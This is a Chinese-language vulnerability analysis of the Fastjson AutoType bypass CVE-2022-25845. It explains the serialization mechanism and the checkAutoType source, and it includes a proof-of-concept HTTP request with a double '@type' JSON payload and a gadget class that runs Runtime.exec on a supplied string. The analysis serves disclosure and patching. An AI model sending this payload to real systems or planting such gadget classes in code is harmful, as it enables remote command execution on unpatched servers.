# 一、漏洞编号

CVE-2022-25845

CNVD-2022-40233

CNNVD-202206-1037

# 二、Fastjson知多少

### 万恶之源AutoType

Fastjson的主要功能是将Java Bean序列化为JSON字符串，这样得到的字符串就可以通过数据库等方式进行持久化了。

但是，Fastjson在序列化及反序列化的过程中，没有使用Java自带的序列化机制，而是自定义了一套机制。

对于JSON框架来说，想要把一个Java对象转换成字符串，有两种选择：

1、基于属性

2、基于Setter/Getter

在我们常用的JSON序列化框架中，Fastjson和Jackson将对象序列化成Json字符串时，是通过遍历该类中所有的Getter方法来进行的。而Gson不是这么做的，它是通过反射遍历该类中的所有属性，并把其值序列化为Json
。

假设我们有下面这个Java类：

> class Store {
>
> private String name;
>
> private Fruit fruit;
>
> public String getName() {
>
> return name;
>
> }
>
> public void setName(String name) {
>
> this.name = name;
>
> }
>
> public Fruit getFruit() {
>
> return fruit;
>
> }
>
> public void setFruit(Fruit fruit) {
>
> this.fruit = fruit;
>
> }
>
> }
>
> interface Fruit {
>
> }
>
> class Apple implements Fruit {
>
> private BigDecimal price;
>
> //省略 setter/getter、toString等
>
> }

 **当我们对它进行序列化时，Fastjson** **会扫描其中的Getter** **方法，即找到getName** **和getFruit**
**，这时就会将Name** **和Fruit** **两个字段的值序列化到JSON** **字符串中。**

那么问题来了，上面定义的Fruit只是一个接口，序列化的时候Fastjson能将属性值正确序列化出来吗？如果可以的话，反序列的时候，Fastjson会把这个Fruit反序列化成什么类型呢？

我们尝试基于Fastjson v1.2.68验证一下：

> Store store = new Store();
>
> store.setName("Hollis");
>
> Apple apple = new Apple();
>
> apple.setPrice(new BigDecimal(0.5));
>
> store.setFruit(apple);
>
> String jsonString = JSON.toJSONString(store);
>
> System.out.println("toJSONString : " + jsonString);

以上代码比较简单，我们创建了一个store，为它指定了名称，并创建了Fruit的子类型Apple，然后将store用JSON.toJSONString进行序列化，可以得到以下JSON内容：

> toJSONString : {
>
> "fruit":{
>
> "price":0.5
>
> }
>
> ,"name":"Hollis"
>
> }

那么，Fruit的类型是什么呢，能否反序列化为Apple呢？我们再来执行以下代码：

> Store newStore = JSON.parseObject(jsonString, Store.class);
>
> System.out.println("parseObject : " + newStore);
>
> Apple newApple = (Apple)newStore.getFruit();
>
> System.out.println("getFruit : " + newApple);

执行结果如下：

> toJSONString : {
>
> "fruit":{
>
> "price":0.5
>
> }
>
> ,"name":"Hollis"
>
> }
>
> parseObject : Store{
>
> name='Hollis', fruit={}}
>
> Exception in thread "main" java.lang.ClassCastException:
> com.hollis.lab.fastjson.test.$Proxy0 cannot be cast to
> com.hollis.lab.fastjson.test.Apple
>
> at com.hollis.lab.fastjson.test.FastJsonTest.main(FastJsonTest.java:26)

  

可以看到，在将store反序列化后，我们尝试将Fruit转换成Apple，但抛出了异常，如果直接转换成Fruit则不会报错，如下：

> Fruit newFruit = newStore.getFruit();
>
> System.out.println("getFruit : " + newFruit);

从以上现象中我们得知， **当一个类中包含了一个接口（或抽象类）的时候，使用** **Fastjson**
**进行序列化，会将子类型抹去，只保留接口（抽象类）的类型，使得反序列化时无法拿到原始类型。**

如何解决这个问题呢？Fastjson引入了AutoType，在序列化时，把原始类型记录下来。使用方法是通过SerializerFeature.WriteClassName进行标记，即将上述代码中的：

> String jsonString = JSON.toJSONString(store);

修改为：

> String jsonString =
> JSON.toJSONString(store,SerializerFeature.WriteClassName);

修改后的代码输出结果如下：

> System.out.println("toJSONString : " + jsonString);
>
> {
>
> "@type":"com.hollis.lab.fastjson.test.Store",
>
> "fruit":{
>
> "@type":"com.hollis.lab.fastjson.test.Apple",
>
> "price":0.5
>
> }
>
> ,
>
> "name":"Hollis"
>
> }

可以看到， **使用** **SerializerFeature.WriteClassName** **进行标记后，JSON**
**字符串中多出了一个@type** **字段，标注了类对应的原始类型，方便在反序列化的时候定位到具体类型。**

如上，将序列化后的字符串再反序列化，就可以顺利拿到Apple类型，整体输出内容如下：

> toJSONString : {
>
> "@type":"com.hollis.lab.fastjson.test.Store","fruit":{
>
> "@type":"com.hollis.lab.fastjson.test.Apple","price":0.5
>
> }
>
> ,"name":"Hollis"
>
> }
>
> parseObject : Store{
>
> name='Hollis', fruit=Apple{price=0.5}}
>
> getFruit : Apple{price=0.5}

这就是Fastjson中引入AutoType的原因，但是也正因为这个特性，因为功能设计之初在安全方面考虑不周，给后续的Fastjson使用者带来了无尽的痛苦。

## checkAutoType

Fastjson为了实现反序列化引入了AutoType，造成：

1、Fastjson是基于内置黑名单来实现安全的，打开AutoType后可能造成安全风险，即绕过黑名单。

2、关闭AutoType后，是基于白名单进行防护的，此次解析的漏洞就是在未开启AutoType时产生的。

从v1.2.25版本开始，Fastjson默认关闭了AutoType支持，并且加入了checkAutoType，加入了黑白名单来防御AutoType开启的情况。

Fastjson绕过历史可以分为AutoType机制绕过和黑名单绕过，绝大部分情况都是寻找一个新的利用链来绕过黑名单，所以Fastjson官方的黑名单列表越来越大；但是更有意义的绕过显然是AutoType机制绕过，这样无需手动配置autoTypeSupport也可能进行利用。

我们先来看一下通过checkAutoType()校验的方式有哪些：

1、白名单里的类

2、开启了AutoType

3、使用了JSONType注解

4、指定了期望类（expectClass）

5、缓存在mapping中的类

6、使用ParserConfig.AutoTypeCheckHandler接口通过校验的类

# 三、攻击思路

 **目标：** 绕过AutoType机制

 **手段：** 通过checkAutoType()校验

 **方法：** 寻找使用checkAutoType()的函数，并使之通过checkAutoType()校验

通过研究v1.2.50和v1.2.68的绕过方式，主要是在ObjectDeserializer接口的子类JavaBeanDeserializer中存在expectClass非空的checkAutoType调用，这也是绕过的关键。顺着这个思路，我们继续在ObjectDeserializer接口的其他子类中寻找expectClass非空的checkAutoType调用，发现在子类ThrowableDeserializer的函数deserialze中也存在满足条件的调用。

![](https://image.3001.net/images/20221024/1666582209_635606c1646616c63e76f.jpg!small)

1.2.80版本的checkAutoType代码如下：

> public Class<?> checkAutoType(Class type) {
>
> if (get(type) != null) {
>
> return type;
>
> }
>
> return checkAutoType(type.getName(), null, JSON.DEFAULT_PARSER_FEATURE);
>
> }
>
> public Class<?> checkAutoType(String typeName, Class<?> expectClass) {
>
> return checkAutoType(typeName, expectClass, JSON.DEFAULT_PARSER_FEATURE);
>
> }
>
> public Class<?> checkAutoType(String typeName, Class<?> expectClass, int
> features) {
>
> if (typeName == null) {
>
> return null;
>
> }
>
> if (autoTypeCheckHandlers != null) {
>
> for (AutoTypeCheckHandler h : autoTypeCheckHandlers) {
>
> Class<?> type = h.handler(typeName, expectClass, features);
>
> if (type != null) {
>
> return type;
>
> }
>
> }
>
> }
>
> final int safeModeMask = Feature.SafeMode.mask;
>
> Boolean safeMode = this.safeMode
>
> || (features & safeModeMask) != 0
>
> || (JSON.DEFAULT_PARSER_FEATURE & safeModeMask) != 0;
>
> if (safeMode) {
>
> throw new JSONException("safeMode not support autoType : " + typeName);
>
> }
>
> if (typeName.length() >= 192 || typeName.length() < 3) {
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> final Boolean expectClassFlag;
>
> if (expectClass == null) {
>
> expectClassFlag = false;
>
> } else {
>
> long expectHash = TypeUtils.fnv1a_64(expectClass.getName());
>
> if (expectHash == 0x90a25f5baa21529eL
>
> || expectHash == 0x2d10a5801b9d6136L
>
> || expectHash == 0xaf586a571e302c6bL
>
> || expectHash == 0xed007300a7b227c6L
>
> || expectHash == 0x295c4605fd1eaa95L
>
> || expectHash == 0x47ef269aadc650b4L
>
> || expectHash == 0x6439c4dff712ae8bL
>
> || expectHash == 0xe3dd9875a2dc5283L
>
> || expectHash == 0xe2a8ddba03e69e0dL
>
> || expectHash == 0xd734ceb4c3e9d1daL
>
> ) {
>
> expectClassFlag = false;
>
> } else {
>
> expectClassFlag = true;
>
> }
>
> }
>
> String className = typeName.replace('$', '.');
>
> Class<?> clazz;
>
> final long h1 = (fnv1a_64_magic_hashcode ^ className.charAt(0)) *
> fnv1a_64_magic_prime;
>
> if (h1 == 0xaf64164c86024f1aL) {
>
> // [
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> if ((h1 ^ className.charAt(className.length() - 1)) * fnv1a_64_magic_prime
> == 0x9198507b5af98f0L) {
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> final long h3 = (((((fnv1a_64_magic_hashcode ^ className.charAt(0))
>
> * fnv1a_64_magic_prime)
>
> ^ className.charAt(1))
>
> * fnv1a_64_magic_prime)
>
> ^ className.charAt(2))
>
> * fnv1a_64_magic_prime;
>
> long fullHash = TypeUtils.fnv1a_64(className);
>
> Boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,
> fullHash) >= 0;
>
> if (internalDenyHashCodes != null) {
>
> long hash = h3;
>
> for (int i = 3; i < className.length(); ++i) {
>
> hash ^= className.charAt(i);
>
> hash *= fnv1a_64_magic_prime;
>
> if (Arrays.binarySearch(internalDenyHashCodes, hash) >= 0) {
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> }
>
> }
>
> if ((!internalWhite) && (autoTypeSupport || expectClassFlag)) {
>
> long hash = h3;
>
> for (int i = 3; i < className.length(); ++i) {
>
> hash ^= className.charAt(i);
>
> hash *= fnv1a_64_magic_prime;
>
> if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
>
> clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
>
> if (clazz != null) {
>
> return clazz;
>
> }
>
> }
>
> if (Arrays.binarySearch(denyHashCodes, hash) >= 0 &&
> TypeUtils.getClassFromMapping(typeName) == null) {
>
> if (Arrays.binarySearch(acceptHashCodes, fullHash) >= 0) {
>
> continue;
>
> }
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> }
>
> }
>
> clazz = TypeUtils.getClassFromMapping(typeName);
>
> if (clazz == null) {
>
> clazz = deserializers.findClass(typeName);
>
> }
>
> if (clazz == null) {
>
> clazz = typeMapping.get(typeName);
>
> }
>
> if (internalWhite) {
>
> clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
>
> }
>
> if (clazz != null) {
>
> if (expectClass != null
>
> && clazz != java.util.HashMap.class
>
> && clazz != java.util.LinkedHashMap.class
>
> && !expectClass.isAssignableFrom(clazz)) {
>
> throw new JSONException("type not match. " + typeName + " -> " +
> expectClass.getName());
>
> }
>
> return clazz;
>
> }
>
> if (!autoTypeSupport) {
>
> long hash = h3;
>
> for (int i = 3; i < className.length(); ++i) {
>
> char c = className.charAt(i);
>
> hash ^= c;
>
> hash *= fnv1a_64_magic_prime;
>
> if (Arrays.binarySearch(denyHashCodes, hash) >= 0) {
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> // white list
>
> if (Arrays.binarySearch(acceptHashCodes, hash) >= 0) {
>
> clazz = TypeUtils.loadClass(typeName, defaultClassLoader, true);
>
> if (clazz == null) {
>
> return expectClass;
>
> }
>
> if (expectClass != null && expectClass.isAssignableFrom(clazz)) {
>
> throw new JSONException("type not match. " + typeName + " -> " +
> expectClass.getName());
>
> }
>
> return clazz;
>
> }
>
> }
>
> }
>
> Boolean jsonType = false;
>
> InputStream is = null;
>
> try {
>
> String resource = typeName.replace('.', '/') + ".class";
>
> if (defaultClassLoader != null) {
>
> is = defaultClassLoader.getResourceAsStream(resource);
>
> } else {
>
> is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
>
> }
>
> if (is != null) {
>
> ClassReader classReader = new ClassReader(is, true);
>
> TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
>
> classReader.accept(visitor);
>
> jsonType = visitor.hasJsonType();
>
> }
>
> }
>
> catch (Exception e) {
>
> // skip
>
> }
>
> finally {
>
> IOUtils.close(is);
>
> }
>
> final int mask = Feature.SupportAutoType.mask;
>
> Boolean autoTypeSupport = this.autoTypeSupport
>
> || (features & mask) != 0
>
> || (JSON.DEFAULT_PARSER_FEATURE & mask) != 0;
>
> if (autoTypeSupport || jsonType || expectClassFlag) {
>
> Boolean cacheClass = autoTypeSupport || jsonType;
>
> clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
>
> }
>
> if (clazz != null) {
>
> if (jsonType) {
>
> TypeUtils.addMapping(typeName, clazz);
>
> return clazz;
>
> }
>
> if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
>
> || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load
> jdbc driver
>
> || javax.sql.RowSet.class.isAssignableFrom(clazz) //
>
> ) {
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> if (expectClass != null) {
>
> if (expectClass.isAssignableFrom(clazz)) {
>
> TypeUtils.addMapping(typeName, clazz);
>
> return clazz;
>
> } else {
>
> throw new JSONException("type not match. " + typeName + " -> " +
> expectClass.getName());
>
> }
>
> }
>
> JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz,
> propertyNamingStrategy);
>
> if (beanInfo.creatorConstructor != null && autoTypeSupport) {
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> }
>
> if (!autoTypeSupport) {
>
> throw new JSONException("autoType is not support. " + typeName);
>
> }
>
> if (clazz != null) {
>
> TypeUtils.addMapping(typeName, clazz);
>
> }
>
> return clazz;
>
> }

# 四、POC

按照上面思路构造POC如下：

> POST /fastjson HTTP/1.1
>
> Host: 172.31.1.101:8080
>
> User-Agent: Mozilla/5.0 (Windows NT 10.0;
>
> Win64;
>
> x64;
>
> rv:101.0) Gecko/20100101 Firefox/101.0
>
> Accept: text/html,application/xhtml+xml,application/xml;
>
> q=0.9,image/avif,image/webp,*
>
> /*;q=0.8
>
> Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
>
> Accept-Encoding: gzip, deflate
>
> Connection: close
>
> Upgrade-Insecure-Requests: 1
>
> Content-Length: 117
>
> {
>
> "@type": "java.lang.Exception",
>
> "@type": "com.example.springfastjson.model.poc20220523",
>
> "name": "control"
>
> }

代码中需要有如下的类：

> package com.example.springfastjson.model;
>
> import java.io.IOException;
>
> public class poc20220523 extends Exception {
>
> public void setName(String str) {
>
> try {
>
> Runtime.getRuntime().exec(str);
>
> }
>
> catch (IOException e) {
>
> e.printStackTrace();
>
> }
>
> }
>
> }

# 五、代码分析

通过一系列的字符检查之后，@type": "java.lang.Exception"步入到checkAutoType 。

![](https://image.3001.net/images/20221024/1666582426_6356079a8885c91caaa3a.jpg!small)

经过checkAutoType函数检查。

![](https://image.3001.net/images/20221024/1666582457_635607b91003d173eba4c.jpg!small)

尝试从缓存mapping中实例化clazz（TypeUtils.addBaseClassMappings已经将java.lang.Exception加入了mapping）：

![](https://image.3001.net/images/20221024/1666582498_635607e2c578bd38b51cb.jpg!small)

![](https://image.3001.net/images/20221024/1666582524_635607fcd0c1afe7c07d9.jpg!small)

往下走getDeserializer返回的ObjectDeserializer为ThrowableDeserializer类型。

![](https://image.3001.net/images/20221024/1666582558_6356081e8b7e32653d41b.jpg!small)

![](https://image.3001.net/images/20221024/1666582613_635608557c8ab1c55bb87.jpg!small)

进入ThrowableDeserializer.deserialze，顺利到达checkAutoType 。

![](https://image.3001.net/images/20221024/1666582663_6356088702b21004d8480.jpg!small)

参数传到checkAutoType函数，且expectClass不为空，顺利绕过checkAutoType函数。

![](https://image.3001.net/images/20221024/1666582704_635608b0217b094625753.jpg!small)

![](https://image.3001.net/images/20221024/1666582789_63560905d48ea45851390.jpg!small)

![](https://image.3001.net/images/20221024/1666582826_6356092a36c5404212a9d.jpg!small)

# 六、解决方案

目前厂商已发布升级补丁以修复漏洞，补丁获取链接：

https://github.com/alibaba/fastjson/wiki/security_update_20220523

